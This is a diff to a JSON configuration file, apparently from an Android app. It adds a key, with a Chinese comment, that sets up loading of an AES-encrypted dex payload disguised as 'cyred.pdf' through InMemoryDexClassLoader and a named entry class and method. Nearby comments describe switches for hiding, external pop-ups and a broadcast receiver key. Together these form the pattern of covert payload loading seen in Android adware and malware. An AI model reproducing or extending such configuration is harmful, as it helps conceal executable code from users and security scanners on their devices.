@@ -9,7 +9,8 @@
   "popSnn": "30-30-60-8-16-80-500-800-40-10",
   "showGV": "981772962-981772963",
   "jmk": "fd2grg5ds4a4r4ef-bfjkl87fk6efhwf6",
-  "all_kg": "qpwo-eiru-tyal-skdj-polk"
+  "all_kg": "qpwo-eiru-tyal-skdj-polk",
+  "zc": "cyred.pdf-AES-dalvik.system.InMemoryDexClassLoader-com.ecft.nice.MasterRu-jkks"
 }
 //B
 {
@@ -46,5 +47,7 @@
   "jmk": "fd2grg5ds4a4r4ef-bfjkl87fk6efhwf6",
   //外弹文件开关名-广播接收key-恢复-隐藏-外弹
   "all_kg": "qpwo-eiru-tyal-skdj-polk",
+  //文件名，加密方式，InMemoryDexClassLoader路径，调用dex方法路径，调用dex方法名，用-号隔开
+  "zc": "cyred.pdf-AES-dalvik.system.InMemoryDexClassLoader-com.ecft.nice.MasterRu-jkks"
 }
 
